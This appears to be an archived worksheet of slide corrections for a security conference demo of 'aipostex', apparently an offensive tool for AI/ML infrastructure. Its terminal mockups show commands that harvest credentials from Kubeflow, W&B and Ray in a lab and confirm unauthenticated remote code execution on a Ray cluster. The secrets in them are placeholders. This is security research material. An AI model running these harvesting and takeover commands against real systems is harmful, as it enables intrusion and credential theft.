# Slide Deck — Required Fixes

> **Archived worksheet (v0.7.0-deck era).** Point-in-time slide-fix notes from a past review
> session; the live-output numbers below were accurate then. For current, maintained deck guidance
> and stats (v1.3.0 — **131 templates / 85 detection / 46 exploit / 18 modules / 22 categories**),
> see `aipostex/docs/conference/defcon-34-deck-review.md`.

Fixes to what's printed **on the slides** (terminal mockups, numbers, labels) —
separate from the narration fixes in `script-fixes.md`. All values verified against
live tool output this session. Only slides needing changes are listed.

Live ground-truth numbers (from `discover network` on 172.16.50.0/24):
- 254 hosts scanned · **22 open ports** · **21 service identities** · 4 hosts with AI services
- **82 findings** (0 critical / 32 high / 16 med / 1 low / 33 info)
- **123 templates = 62 detection / 61 exploit**
- 3 ambiguous services · 2 non-HTTP skipped

There is **no "29"** anywhere in real output.

---

## Slide 9 — Demo menu

**Demo C row is built on commands that don't work (see Slide 12). Update the chip + subtitle.**

- Subtitle now: "One harvest across distributed compute, experiment tracking, pipelines, and inference."
  → change to: **"Secrets across pipelines, tracking, and compute — then code execution on the compute."** (the dual angle; drop "inference" — not in the rebuilt demo)
- Command chip now: `aipostex ray … jobs · mlflow … enum · kubeflow … enum`
  → change to: **`aipostex kubeflow … pipelines · wandb … secrets · ray … jobs · ray … cluster-info`**
  (note: `kubeflow … enum` was wrong — the subcommand is `pipelines`; `mlflow enum` is dropped, `run_count=0`)

---

## Slide 10 — Demo A (Shadow AI map)

Keep the command as **`aipostex discover network --target 172.16.50.0/24`** (correct — do NOT switch to assess; assess exits with a yellow "incomplete coverage" warning that reads badly live).

Terminal mockup — fix the numbers to match real output:
- `AI/ML endpoints identified: 29` → **`21`** (service identities). Optionally show **`22 open ports`** too.
- `Workflow targets generated: 29` → drop the number or use **`21`** (one per service identity); "29" is invented.
- `Probed 4 hosts` → misleading (it scans **254**, finds services on 4). Reword to **`254 hosts probed · 4 with AI services`** or just `Hosts with AI services: 4`.
- `Loaded 123 templates / 21 categories` → **`Loaded 123 templates (62 detection, 61 exploit)`** ("21 categories" is unverified; the 21 is service identities, not categories).
- `Mode: Detection only (exploitation gated)` → ✅ correct, keep.

Families line (`ollama, jupyter, mcp, chromadb, mlflow, litellm, ray, weaviate, qdrant…`) ✅ all present live — keep.

---

## Slide 11 — Demo B (Notebook secret to gateway)

**Keep the existing flow exactly. ADD `enum` as a middle beat** (between read-notebook
and generate) to show the catalog. Do NOT remove `generate` — it stays the finale.

Three beats:
- Beat 1 — `aipostex jupyter … read-notebook …` → `[*] Mined 3 secret(s)` ✅ keep as-is
  (accurate: Anthropic, OpenAI, PostgreSQL).
- Beat 2 (NEW — insert this) — show what the key unlocks:
  ```
  aipostex openai-compat --target http://172.16.50.20:4000 \
      --api-key sk-proj-FAKE-notebook-key-1234567890abcdef enum
  ```
  Output:
  ```
  [*] Enumerated 6 OpenAI-compatible model(s)   (4 frontier)
   HIGH  High-value model exposed: bedrock-claude
   HIGH  High-value model exposed: claude-sonnet
   HIGH  High-value model exposed: gpt-4
   HIGH  High-value model exposed: gpt-4o
  ```
  Narration beat: "one forgotten key unlocks the whole catalog — Claude, GPT-4o,
  all of it, on the company's bill. You could run inference on any of them; for the
  demo I'll use the local model."
- Beat 3 — **keep the existing `generate --model local-smollm … --force-exploit`
  block exactly as it is.** Verified live: `status=200 success=true`. This is the
  finale (actually executing inference through the gateway).

⚠️ Do NOT run `generate` against `gpt-4o`/`claude-sonnet` live — the proxy advertises
them via enum but has no real upstream creds, so a `generate` call returns a raw
401→429 error wall. enum shows they're exposed; smollm is what you actually run.

- **`./aipostex` → `aipostex`** (mockup mixes bare and `./`; make all bare — it's on PATH).
- Caption "No credential was typed by hand…" ✅ still true — keep.

---

## Slide 12 — Demo C (ML platform credential chain)

**Biggest rework. The current mockup shows commands that produce no/empty output live.** Replace the terminal block entirely.

Remove / change:
- `mlflow … enum` → `[+] run params: tokens, S3 URIs`  ← live shows **run_count=0**, no params (drop it)
- `huggingface … generate --prompt "Hello"`  ← not part of the chain (drop it)
- old `ray … jobs → 0 credentials` and `cluster-info → exfil job accepted` are
  **stale** — after the latest build + a Ray re-seed they now show 14 creds and a
  confirmed RCE (see replacement block below)

Replace with (all verified live this session — secrets ×3, then Ray RCE finale):
```
$ aipostex kubeflow --target http://172.16.50.20:9000 pipelines
 HIGH  churn-model-retraining
   HF_TOKEN=hf_FAKE…  SNOWFLAKE_CONN_STR=snowflake://…
 HIGH  fraud-detection-bert
   AWS_ACCESS_KEY_ID=AKIAFAKE…  AWS_SECRET_ACCESS_KEY=FakeFraud…

$ aipostex wandb --target http://172.16.50.20:8444 secrets \
      --entity acme-ml-team --project churn-prediction
 HIGH  6 embedded secret(s): WANDB_API_KEY, OPENAI_API_KEY, HF_TOKEN,
       AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY  (named, per run)

$ aipostex ray --target http://172.16.50.20:8265 jobs
 CRIT  Ray job runtime_env secrets exposed: churn-model-retraining
   AWS_ACCESS_KEY_ID=AKIAFAKE…  DATABASE_URL=postgresql://…  HF_TOKEN=hf_FAKE…
   WANDB_API_KEY=…  S3_MODEL_BUCKET=…  REDIS_URL=…   (+ 2 more)
 → 3 CRITICAL findings · 14 credentials harvested

$ aipostex ray --target http://172.16.50.20:8265 cluster-info --force-exploit
 CRIT  Ray cluster takeover — unauthenticated remote code execution confirmed
   proof: takeover · execution-confirmed
   evidence: code RAN on a worker → ran as mluser@ailab-ml (Linux-6.8 kernel)
```

Right rail ("credential reuse" panel) — update rows + fix the header artifact:
- Header renders as **`\]CREDENTIAL REUSE`** → fix to **`CREDENTIAL REUSE`** (escaping bug).
- Rows:
  - **Kubeflow** → pipeline params leak HF / Snowflake / AWS keys in plaintext
  - **W&B** → 6 secrets embedded in run configs (named, per-run)
  - **Ray (jobs)** → 14 credentials lifted from job runtime_env
  - **Ray (cluster-info)** → unauthenticated RCE — code executed on the compute node
  - (drop the HuggingFace row)

Note: `ray jobs` and `cluster-info` print full evidence inline now — no `| jq` step
to reveal the creds or the RCE output. (W&B still collapses to the named list above;
the secret names show in the console finding.)

---

## Quick checklist
- [ ] S9: subtitle + command chip → kubeflow/wandb/ray
- [ ] S10: 29→21, fix "probed 4 hosts", templates 62/61, drop "21 categories"
- [ ] S11: generate→enum (gpt-4o/claude), `./aipostex`→`aipostex`
- [ ] S12: replace terminal block (kubeflow/wandb/ray), fix `\]CREDENTIAL REUSE`, update rail rows
- [ ] Global: any "29 endpoints" on other slides → "21" / "two dozen"
